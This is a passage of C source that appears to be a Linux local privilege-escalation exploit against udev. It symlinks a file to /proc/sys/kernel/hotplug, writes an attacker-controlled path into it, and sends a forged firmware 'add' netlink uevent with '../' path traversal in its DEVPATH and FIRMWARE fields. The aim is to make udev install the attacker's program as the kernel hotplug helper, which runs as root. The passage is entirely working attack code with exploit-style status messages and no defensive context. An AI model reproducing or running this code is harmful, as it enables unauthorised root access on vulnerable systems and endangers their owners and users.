if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
		die("[-] socket");

	close(creat("loading", 0666));
	if ((ofd = creat("hotplug", 0644)) < 0)
		die("[-] creat");
	if (write(ofd, path , strlen(path)) < 0)
		die("[-] write");
	close(ofd);
	symlink("/proc/sys/kernel/hotplug", "data");
	snprintf(buf, sizeof(buf), "ACTION=add%cDEVPATH=/..%s%c"
	         "SUBSYSTEM=firmware%c"
	         "FIRMWARE=../../..%s/hotplug%c", 0, basedir, 0, 0, basedir, 0);
	printf("[+] sending add message ...");
	if (sendmsg(sock, &msg, 0) < 0)
		die("[-] sendmsg");
	close(sock);
